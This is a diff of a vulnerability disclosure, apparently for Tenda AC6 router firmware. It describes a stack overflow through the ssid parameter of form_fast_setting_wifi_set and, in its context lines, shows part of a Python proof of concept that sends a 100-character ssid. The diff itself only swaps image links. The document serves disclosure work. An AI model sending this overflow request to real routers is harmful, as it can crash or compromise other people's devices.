@@ -6,7 +6,8 @@ form\_fast\_setting\_wifi\_ set ssid
 *   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
 *   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)
 
-![](api/attachments/OLpMhoNjD8Vg/image/image.png)
+![image](https://github.com/user-attachments/assets/01ecd393-3478-4915-bd70-4cea66aa9aef)
+
 
 ### Affected version
 
@@ -27,7 +28,8 @@ The acting parameter ssid of the function form\_fast\_setting\_wifi\_set in the 
 
 In the function form\_fast\_setting\_wifi\_set, it reads the user-supplied arguments into src and `strcpys`
 
-![](api/attachments/OzhOMXwsr5cB/image/image.png)
+![image](https://github.com/user-attachments/assets/fdb34995-3742-4c88-a894-36029c9bb87b)
+
 
 ### poc
 
@@ -40,6 +42,5 @@ url += "ssid=" + "s" * 100
 
 response = requests.get(url)
 ```
-
-![](api/attachments/XJRH28oqmYZp/image/image.png)
+![image](https://github.com/user-attachments/assets/727548ad-007b-4ec2-bac5-b409d1159c9f)
 
